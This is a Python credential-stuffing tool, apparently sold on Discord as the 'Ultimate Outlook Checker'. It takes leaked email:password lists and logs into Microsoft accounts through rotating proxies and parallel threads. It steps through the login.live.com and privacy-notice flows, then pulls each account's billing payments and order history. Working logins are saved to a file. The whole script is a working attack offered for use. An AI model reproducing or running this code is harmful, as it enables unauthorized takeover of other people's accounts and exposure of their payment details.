import requests
import threading
from colorama import Fore,init
import sys,json
import json
import re, random, string,urllib.parse
import console.utils 
from console.utils import set_title
from requests_toolbelt import MultipartEncoder
from uuid import uuid4
import pystyle
from pystyle import Write, Colors
from colorama import Fore, Style;import ctypes
import platform
import os
import hashlib
from datetime import datetime
from time import sleep


Total = len(open("accounts.txt", "r").read().splitlines())
dead = 0
lol =0

set_title(f"Nova X Checker | {lol}/{Total}  | Bad : {dead}  " )
request_exceptions = (requests.exceptions.SSLError,requests.exceptions.ProxyError,requests.exceptions.Timeout)
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
def sprint(content, status: str="c") -> None:
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
def remove_content(file_path : str, line_to_remove : str):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    lines = [line for line in lines if line.strip() != line_to_remove.strip()]
    with open(file_path, 'w') as file:
        file.writelines(lines)
def read_proxies_from_file(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies
def main(mscred: str):
    global lol,dead 
    proxies_file_path = 'proxies.txt'
    proxies = read_proxies_from_file(proxies_file_path)
    if proxies:
          proxi = random.choice(proxies)
          fmtRotate = {
          'http': f"http://{proxi}",
          } 
    else:
           fmtRotate = None
    try:
        try:
            email = mscred.split("|")[0]
            password = mscred.split("|")[1]
        except:
            email = mscred.split(":")[0]
            password = mscred.split(":")[1]
    except:
        remove_content("accounts.txt", mscred)
        return
    s = requests.session()
    s.proxies = fmtRotate
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}

    while True:
        try:
            response = s.get('https://login.live.com/ppsecure/post.srf', headers=headers,timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(str(e),"r")
            return 'lol'
    try:
        ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        log_url = response.split(",urlPost:'")[1].split("'")[0]
    except:
        sprint("[-] Unknown Error (Proxies probably banned)")
        return 'lol'
    log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
            }  
    while True:
        try:
            response = s.post(log_url,timeout=20,data=log_data,headers=headers)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return 'lol'
    if 'https://privacynotice.account.microsoft.com/notice' in response.text:
        privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
        while True:
            try:
                privNotifPage = s.post(privNotifUrl,headers={
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'path' : privNotifUrl.replace('https://privacynotice.account.microsoft.com',''),
    'accept-language': 'en-US,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://login.live.com',
    'referer': 'https://login.live.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent':ua,
},data={'correlation_id':corelationId,
        'code':mCode}).text
                break
            except:
                continue
        try:
            m = MultipartEncoder(fields={'AppName': 'ALC',
    'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
    'ConsentSurface': 'SISU',
    'ConsentType': 'ucsisunotice',
    'correlation_id': corelationId,
    'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
    'DeviceId':'' ,
    'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0]
    ,'FormFactor': 'Desktop',
    'InitVector':privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
    'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
    'ModelType': 'ucsisunotice',
    'ModelVersion': '1.11',
    'NoticeId': privNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
    'Platform': 'Web',
    'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
    'UserVersion': '1'},boundary='----WebKitFormBoundary' \
            + ''.join(random.sample(string.ascii_letters + string.digits, 16)))
        except:
            return 'gaybehavior'
        headers = {
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': m.content_type,
    'origin': 'https://privacynotice.account.microsoft.com',
    'referer': privNotifUrl,
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': ua,
}

        while True:
            try:
                response = s.post('https://privacynotice.account.microsoft.com/recordnotice', headers=headers, data=m)
                break
            except:
                continue

        while True:
            try:
                response = s.get(urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1]),headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Connection': 'keep-alive',
        'Referer': 'https://privacynotice.account.microsoft.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    })
                break
            except:
                continue


    try:
        ppft2 = re.findall("sFT:'(.+?(?=\'))", response.text)[0],
        url_log2 = re.findall("urlPost:'(.+?(?=\'))", response.text)[0]
    except:
        dead +=1
        lol += 1
        sprint(Fore.LIGHTRED_EX + F"[-] {email} ---> INVALID!")
        open('invaild.txt', 'a').write(f'{email}:{password}\n') 
        return 'lol'


    log_data2 = {
    "LoginOptions": "3",
    "type": "28",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": ppft2,
    "i19": "19130"
}
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': log_url,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
    }
    while True:
        try:
            midAuth2 = s.post(url_log2,timeout=20,data=log_data2,headers=headers).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return 'lol'
    while "fmHF" in midAuth2:
        midAuth2 = {
"fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
"pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
"nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
"anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
"t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
        data = {
    'pprid': midAuth2["fmHF"],
    'NAP': midAuth2['nap'],
    'ANON': midAuth2['anon'],
    't': midAuth2['t'],
}
        loda_lund = midAuth2['fmHF']
        while True:
            try:
                midAuth2 = s.post(loda_lund,data=data,headers={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}).text     
                break
            except request_exceptions:
                continue
            except Exception as e:
                sprint(e,"r")
                return 'lol'
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'fref': 'home.drawers.payment-options.manage-payment',
    'refd': 'account.microsoft.com',
}
    while True:
        try:
            response = s.get('https://account.microsoft.com/billing/payments', params=params, headers=headers)
            break
        except request_exceptions:continue
        except Exception as e:
            sprint(e,"r")
            return 'lol'
    try: 
        vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    except:
        try:
            fuck = response.text.split('<meta name="description" content="')[1].split('"')[0]
            if fuck == "Try again later":
                print(Fore.LIGHTRED_EX +f"[-] Microsoft Server Down: Please {fuck}")
                return 'exit'
        except:
            return 'Sad But Microsoft Server Is currently Down Please Try Later'
    
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip,deflate,br',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'account.microsoft.com',
        'MS-CV': 'XeULpZy1H023MIm9.7.51',
        'Referer': response.url,
        'Origin': 'https://login.live.com',
        'Referer': log_url,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
        '__RequestVerificationToken': vrf_token,
    }
    params = {
        'period': 'ThreeMonths',
        'orderTypeFilter': 'All',
        'filterChangeCount': '0',
        'isInD365Orders': True,
        'isPiDetailsRequired': True,
        'timeZoneOffsetMinutes': '-330',
    }
    json_data = s.get("https://account.microsoft.com/billing/orders/list", params=params, headers=headers).json()
    xboxlol = 0

    try:
        total_orders = json_data['orders']
        orders_count = len(total_orders)
        print(Fore.GREEN + f"[+] {email}  ------> VALID")
        open('worked.txt', 'a').write(f'{email}:{password}\n') 
        lol += 1

        processed_emails = set()

        for email in processed_emails:
                open('worked.txt', 'a').write(f'{email}:{password}\n') 

    except KeyError:
        print(total_orders)
        print(f"[-] No Orders Found. ","r")
        return 'exit'
    except Exception as e:
        print("[-] An error occurred:", e)
        return 'exit'
                    

    set_title(f"Nova X Checker | {lol}/{Total} | Bad : {dead}" )
    if orders_count > 0:
        return 'done'


def worker():
    while True:
        try:
            mscred = accounts.pop(0)
        except IndexError:
            break
        result = main(mscred)
        if result == 'exit':
            break

def run_threads(num_threads):
    thread_list = []

    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

init()

if __name__ == "__main__":
    accounts = open("accounts.txt", "r").read().splitlines()
def set_console_title():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Checker | {lol}/{Total} | Bad : {dead} ")

text = '''
   __  ______  _                 __     
  / / / / / /_(_)___ ___  ____ _/ /____ 
 / / / / / __/ / __ `__ \/ __ `/ __/ _ \
/ /_/ / / /_/ / / / / / / /_/ / /_/  __/
\____/_/\__/_/_/ /_/ /_/\__,_/\__/\___/ 
    
'''

Write.Print(text, Colors.red, interval=0)
num_threads = int(input("Pls put threads: ")) 
run_threads(num_threads)
Write.Print("ALL ACCOUNTS ARE CHECKED THANKYOU FOR USING Ultimate Outlook Checker", Colors.cyan, interval=0)
print(" ")
Write.Print("DM termwave_ ON DISCORD TO BUY MORE PRODUCT TY <3", Colors.cyan, interval=0)
print(" ")
input('press enter to exit.....')